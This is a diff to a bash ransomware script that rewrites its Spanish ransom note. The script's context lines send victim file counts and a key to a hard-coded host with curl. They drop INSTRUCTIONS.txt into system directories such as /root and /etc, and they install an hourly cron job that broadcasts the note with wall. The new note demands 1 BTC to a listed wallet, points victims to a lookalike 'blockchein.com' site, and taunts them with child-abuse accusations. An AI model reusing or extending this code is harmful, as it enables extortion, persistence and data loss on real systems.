@@ -265,7 +265,7 @@ curl -k -d "fileCount=${count}&uniqueId=${genKey}" https://192.168.1.132/count.p
 for directory in /root/ /home/ /etc/ /bin/ /usr/sbin/ /usr/bin /sbin/ /usr/local/bin/
 do
   {
-    echo "Tus archivos estan encriptados con RSA-4096. Tienes que visitar la página https://192.168.1.132/decrypt.php and the id ${genKey}.Realiza el pago de 1BTC y recuperaras la clave, la wallet en la que tienes que depositar los bitcoins es 1MsktgD6XV1LNkBJLnTxEKs5F5hKkHNahr  Si no lo haces en las 48 horas, todo tu sistema se eliminara para siempre ."
+    echo "MUY BUENAS HERMANO, TE PREGUNTARAS QUE HA PASADO? TODOS TUS DATOS ESTAN CIFRADOS CON RSA-4096, ADEMAS HE DECIDIDO DEJARTE SIN VER TEMPORALMENTE FOTOS Y VIDEOS DE NIÑ@S PEQUEÑ@S, LO HICE POR TU BIEN, TIENES QUE DEPOSITAR EL PAGO EN BITCOINS PARA QUE TODO VUELVA A LA NORMALIDAD Y SIGAS HACIENDO LO QUE HACIAS https://192.168.1.132/decrypt.php and the id ${genKey}. REGISTRATE EN https://blockchein.com  Y PAGA 1BTC A ESTA WALLET; 1MsktgD6XV1LNkBJLnTxEKs5F5hKkHNahr  SI NO LO PAGAS EN 48 HORAS, NO VOLVERAS A VER PORNOGRAFIA INFANTIL."
     
   } >> "${directory}/INSTRUCTIONS.txt"
 
@@ -277,7 +277,7 @@ done
   echo -e "\n"
   echo -e "wallCmd=\$(which wall)"
   echo -e "\n"
-  echo -e "echo -e \"Tus archivos estan encriptados con RSA-4096. Tienes que visitar la página https://192.168.1.132/decrypt.php and the id ${genKey}. Realiza el pago de 1BTC y recuperaras la clave, la wallet que tienes que depositar los bitcoins es 1MsktgD6XV1LNkBJLnTxEKs5F5hKkHNahr  forever.\\n\\nIMPORTANT: F Si no lo haces en 48 horas, todo tu sistema se eliminara para siempre.\" | \${wallCmd}"
+  echo -e "echo -e \"MUY BUENAS HERMANO, TE PREGUNTARAS QUE HA PASADO? TODOS TUS DATOS ESTAN CIFRADOS CON RSA-4096. ADEMAS HE DECIDIDO DEJARTE SIN VER TEMPORALMENTE FOTOS Y VIDEOS DE NIÑ@S PEQUEÑ@S, LO HICE POR TU BIEN, TIENES QUE DEPOSITAR EL PAGO EN BITCOINS PARA QUE TODO VUELVA A LA NORMALIDAD Y SIGAS HACIENDO LO QUE HACIAS https://192.168.1.132/decrypt.php and the id ${genKey}. REGISTRATE EN https://blockchein.com  Y PAGA 1BTC A ESTA WALLET;  1MsktgD6XV1LNkBJLnTxEKs5F5hKkHNahr SI NO PAGAS EN 48 HORAS, OLVIDATE PARA EL RESTO DE TU VIDA VER PORNOGRAFIA INFANTIL. forever.\\n\\nIMPORTANT: F CUIDATE MI HERMANO, DE LOS ERRORES SE APRENDE.\" | \${wallCmd}"
 } > /etc/cron.hourly/instructions.sh
 
 chmod 755 /etc/cron.hourly/instructions.sh
